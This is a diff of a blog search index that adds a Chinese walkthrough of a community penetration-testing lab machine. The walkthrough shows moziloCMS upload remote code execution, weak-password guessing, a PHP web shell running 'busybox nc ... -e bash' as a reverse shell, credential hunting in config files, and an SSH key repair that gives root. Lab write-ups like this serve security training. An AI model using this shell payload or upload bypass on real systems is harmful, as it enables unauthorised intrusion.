@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>群友靶机之Lzh</title>
+      <link href="/posts/41646.html"/>
+      <url>/posts/41646.html</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取靶机地址：</span><br><span class="line">https://maze-sec.com/</span><br><span class="line">qq群：660930334</span><br></pre></td></tr></table></figure><h1 id="配置："><a href="#配置：" class="headerlink" title="配置："></a>配置：</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">靶机用VirtualBox制作，VMware导入可能网卡不兼容</span><br><span class="line">用户:todd 密码:qq660930334</span><br><span class="line">1. 启动虚拟机时按`e`键进入GRUB编辑模式</span><br><span class="line">2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`</span><br><span class="line">3. 按Ctrl+X启动进入单用户模式</span><br><span class="line">vim /etc/network/interfaces</span><br><span class="line">allow-hotplug ens33</span><br><span class="line">iface ens33 inet dhcp</span><br><span class="line"></span><br><span class="line">ip link set ens33 up</span><br><span class="line">dhclient ens33</span><br><span class="line">reboot -f</span><br></pre></td></tr></table></figure><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p><img src="/../images/image-20251214153738204.png" alt="image-20251214153738204"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">依旧是22,80端口</span><br></pre></td></tr></table></figure><h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><p><img src="/../images/image-20251214153955731.png" alt="image-20251214153955731"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给了个cms的源码,应该是有部署了这一套的cms，尝试访问/mozilo/</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251214155312392.png" alt="image-20251214155312392"></p><h1 id="立足点"><a href="#立足点" class="headerlink" title="立足点"></a>立足点</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果是cms，那应该就是打的nday了【之前打的awd倒是很多这种】</span><br><span class="line">版本也给了，直接搜发现有个rce的洞</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251214155724844.png" alt="image-20251214155724844"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">看了利用方式那就是后台直接upload文件上传，然后</span><br><span class="line">在/kategorien/Willkommen/dateien/反弹shell就好了</span><br><span class="line">漏洞点是在后台的，对于常规cms的密码设置可能会出现在安装文件或者配置文件当中，可以尝试去翻阅一下</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251214160825912.png" alt="image-20251214160825912"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">虽然没有直接找到默认的账号密码，但是找到了账号密码的设置条件【至少8位字符，有数字，有小写字母，有大写字母】，可以对于爆破的字典进行正则匹配一下，更精准一点</span><br><span class="line">^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[a-zA-Z\d]&#123;8,&#125;$</span><br><span class="line">admin/Admin123</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251214162147409.png" alt="image-20251214162147409"></p><h1 id="nday获得webshell"><a href="#nday获得webshell" class="headerlink" title="nday获得webshell"></a>nday获得webshell</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">进来找到上传文件的地方,正常的文件上传流程尝试一下</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251214162322443.png" alt="image-20251214162322443"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">exec(&quot;busybox nc 192.168.44.128 4444 -e bash&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接上传php文件显示Filetype not allowed，但是发现上传之后可以重命名文件，那么就先上传txt再修改成php就好了，然后来到反弹shell就好了</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251214162654602.png" alt="image-20251214162654602"></p><p><img src="/../images/image-20251214162756225.png" alt="image-20251214162756225"></p><p><img src="/../images/image-20251214162916346.png" alt="image-20251214162916346"></p><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">拿到webshell之后想要获得用户权限--去home下发现用户welcome，对于cms来说数据库和配置文件可能会存有账号密码，那就翻翻翻加grep好了</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251214163349051.png" alt="image-20251214163349051"></p><p><img src="/../images/image-20251214163503120.png" alt="image-20251214163503120"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su welcome</span><br><span class="line">3e73d572ba005bb3c02107b2e2fc16f8</span><br></pre></td></tr></table></figure><h1 id="权限再提升"><a href="#权限再提升" class="headerlink" title="权限再提升"></a>权限再提升</h1><p><img src="/../images/image-20251214163726857.png" alt="image-20251214163726857"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现本地有一个id_rsa私钥文件，直接连上去显示格式错误</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251214164102647.png" alt="image-20251214164102647"></p><p><img src="/../images/image-20251214164130494.png" alt="image-20251214164130494"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat一下文件发现前三位没有了导致格式错误，联想到图片之类的文件的文件头缺少会导致不可用，是不是id_rsa私钥文件也有相应的文件头</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----OpenSSH 格式 前三个字符是b3B版本标识符 &quot;openssh-key-v1&quot; 开头的编码结果 </span><br><span class="line">那就新建一个rsa文件【因为没有权限直接改id_rsa文件】把前三个字符改成rsa连接一下试试</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251214170027876.png" alt="image-20251214170027876"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一开始直接给777权限会显示权限设置过于宽松，存在安全风险，因此SSH客户端拒绝使用，改成600就好了</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">常规的cms打nday获得webshell再</span><br><span class="line">配置文件存在默认账号密码获得用户权限再</span><br><span class="line">正确修改ssh私钥格式连接获得root权限</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 群友靶机 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>做梦都想进vn之base2024ctf</title>
       <link href="/posts/26285.html"/>
       <url>/posts/26285.html</url>
@@ -201,28 +226,6 @@
     
     
     <entry>
-      <title>categories</title>
-      <link href="/categories/index.html"/>
-      <url>/categories/index.html</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>friend</title>
-      <link href="/link/index.html"/>
-      <url>/link/index.html</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>Who am I ?</title>
       <link href="/about/index.html"/>
       <url>/about/index.html</url>
@@ -237,6 +240,28 @@
       <title>tags</title>
       <link href="/tags/index.html"/>
       <url>/tags/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>categories</title>
+      <link href="/categories/index.html"/>
+      <url>/categories/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>friend</title>
+      <link href="/link/index.html"/>
+      <url>/link/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
